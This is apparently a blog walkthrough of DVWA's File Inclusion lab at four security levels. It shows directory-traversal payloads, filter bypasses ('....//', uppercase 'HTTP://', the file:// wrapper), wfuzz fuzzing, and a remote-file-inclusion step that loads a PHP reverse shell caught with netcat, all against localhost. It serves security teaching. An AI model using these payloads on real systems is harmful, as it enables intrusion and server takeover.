---
title: DVWA - File Inclusion
date: 2023-12-09
categories: [DVWA]
tags: [dvwa, file-inclusion, burp-suite, directory-traversal, wfuzz, dir-busting]
img_path: /assets/dvwa/file_inclusion
published: true
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## File Inclusion

Some web applications **allow the user to specify input that is used directly into file streams or allows the user to upload files to the server**. At a later time the web application accesses the user supplied input in the web applications context. By doing this, the web application is allowing the potential for malicious file execution. 

If the file chosen to be included is local on the target machine, it is called **Local File Inclusion (LFI)**. But files may also be included on other machines, which then the attack is a **Remote File Inclusion (RFI)**. When RFI is not an option, using another vulnerability with LFI, such as file upload and directory traversal, can often achieve the same effect.

**Objective**: Read all five famous quotes from `../hackable/flags/fi.php` using only the file inclusion.

## Enabling allow_url_include function

To make the "The PHP function allow_url_include is not enabled." message to disappear:

1. Make the following [changes](https://github.com/digininja/DVWA?tab=readme-ov-file#php-configuration):

    ![](php_config_changes.png)

    ```shell
    # editing file with nano
    sudo nano /etc/php/8.2/fpm/php.ini
    ```

    Press `CTRL+W` and search for "allow_url_":

    ![](allow_url_include.png)

2. Restart the php-fpm service:

    ```shell
    # restarting the php-fpm service (change `8.2` to your version)
    sudo /etc/init.d/php8.2-fpm restart
    Restarting php8.2-fpm (via systemctl): php8.2-fpm.service.
    ```

3. Refresh the page.

    ![](message_left.png)

> Source [video walkthrough](https://www.youtube.com/watch?v=KY58WcX7OZ4).

## Security: Low

> _This allows for direct input into one of many PHP functions that will include the content when executing. Depending on the web service configuration will depend if RFI is a possibility._

```php
# source code for low security
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?> 
```

### Local File Inclusion

When we click any of the 3 files on the FI homepage, the address bar changes like this:

![](file2.png)

If we change the file number to `4`:

![](file4.png)

That's something, but our goal is to find 5 quotes! By viewing the page source, we notice that the structure of each directory is preceded by `../../`:

```html
<li class=""><a href="../../instructions.php">Instructions</a></li>
<li class=""><a href="../../setup.php">Setup / Reset DB</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
<li class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
<li class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
<li class="selected"><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
<li class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
<li class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
<li class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
<li class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
<li class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
<li class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
<li class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
<li class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
<li class=""><a href="../../vulnerabilities/csp/">CSP Bypass</a></li>
<li class=""><a href="../../vulnerabilities/javascript/">JavaScript</a></li>
<li class=""><a href="../../vulnerabilities/open_redirect/">Open HTTP Redirect</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../security.php">DVWA Security</a></li>
<li class=""><a href="../../phpinfo.php">PHP Info</a></li>
```

If we capture the traffic of the file inclusion page, it looks like this:

![](get_proxy.png)

Notice that we are in the `/vulnerabilities/fi/` directory and requesting the `include.php` page. Thus, we can try get out of this directory by including `../../` and then try to reach the desired path, i.e., `hackable/flags/fi.php`:

![](low_dir_traversal.png)

By visiting the URL we get the three quotes:

![](low_3_5_quotes.png)

By viewing the page source we get the fifth quote:

![](low_4_5_quotes.png)

Note that we should use the include function for the directory traversal attack to work, otherwise, it does not work:

![](without_include.png){: .normal}

We are missing one quote, so we can try searching for other `.php` files via dir-busting ([command explanation](https://youtu.be/KY58WcX7OZ4?t=541)):

```shell
# searching for '.php' file in the '/hackable/flags' directory
wfuzz -c --hh 3152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b "PHPSESSID=m4ac6f2g7uig8aec7hgc8787kc; security=low" -u "http://127.0.0.1:42001/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:42001/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000001557:   200        93 L     266 W      3509 Ch     "fi"

Total time: 166.8337
Processed Requests: 220560
Filtered Requests: 220559
Requests/sec.: 1322.034
```

Nothing but the already known `fi` file found!

### Remote File Inclusion

1. Get [Pentestmonkey's PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and make the required changes:

    ![](shell_script.png)

2. Launch a Python webserver from within the directory where the reverse shell is residing:

    ```shell
    # launcing a webserver on port 8888
    python3 -m http.server 8888
    Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
    ```

3. Visit the webserver via the browser and copy the link directing to the shell script:

    ![](webserver_browser.png)

4. Open a netcat listener:

    ```shell
    # setting up a listener on port 9999
    sudo nc -lvnp 9999
    listening on [any] 9999 ...
    ```

5. Paste the link as the value of the `page` parameter:

    ![](visiting_shell.png)

6. Check the listener:

   ```shell
   # catching the reverse shell
   sudo nc -lvnp 9999
    listening on [any] 9999 ...
    connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43942
    Linux CSpanias 5.15.133.1-microsoft-standard-WSL2 #1 SMP Thu Oct 5 21:02:42 UTC 2023 x86_64 GNU/Linux
    17:12:24 up  5:50,  2 users,  load average: 0.06, 0.07, 0.25
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    kali              -                12:33    6:21m  0.00s   ?    /usr/sbin/xrdp-sesman
    kali     pts/1    -                10:40    6:31m  0.00s   ?    -bash
    uid=149(_dvwa) gid=156(_dvwa) groups=156(_dvwa)
    /bin/sh: 0: can't access tty; job control turned off
    $   
   ```

> If this was a remote webserver, and not hosted on our PC, we would gain access to the actual webserver where we could further enumerate the network, pivot, or perform privilege escalation.

## Security: Medium

> _The developer has read up on some of the issues with LFI/RFI, and decided to filter the input. However, the patterns that are used, isn't enough._

```php
# source code for medium security
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?> 
```

### Local File Inclusion

1. Since the developer now removes the `../`, the directory traversal attack should not work:

    ![](medium_dir_trav.png)

2. However this can bypassed very easy by just doubling the characters used from `../` to `....//`:

    ![](medium_bypass.png)

As you can see below, only what's within red rectangles will be removed:

![](doubling_explanation.png)

### Remote File Inclusion

1. Since the developer now also removes the `http://`, the same RFI process for getting a reverse shell as before should not work:

    ![](fail_rev_shell.png)

2. However, the source code is checking for an exact match so changing any lowercase letter to uppercase would bypass this measure:

    ![](capital_rev_shell.png)

3. We can also do exactly what we did for LFI above, that is, doubling the characters:

    ![](doubling_rev_shell.png)

## Security: High

> _The developer has had enough. They decided to only allow certain files to be used. However as there are multiple files with the same basename, they use a wildcard to include them all._

```php
# source code for high security
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

> The logical operator `&&` returns: `TRUE` only if both of its operands evaluate to true, and `FALSE` if either or both of its operands evaluate to false.

1. The developer has now set some conditions: the file must start with `file` (followed by anything else) or should be the `include.php`. As a result, both directory traversal attacks now fail:

    ![](high_error_dir_trav.png)

    ![](high_error_double_dir_trav.png)

2. Since the word `file` is allowed, we can use the `file://` [PHP wrapper](https://www.php.net/manual/en/wrappers.php) and the full file path to read our target file:

    ![](php_wrappers.png)

## Security: Impossible

> _The developer calls it quits and hardcodes only the allowed pages, with there exact filenames. By doing this, it removes all avenues of attack._

```php
# source code for impossible security
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

## Resources

- [LFI Cheatsheet](https://highon.coffee/blog/lfi-cheat-sheet/)
- [Hacktricks File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
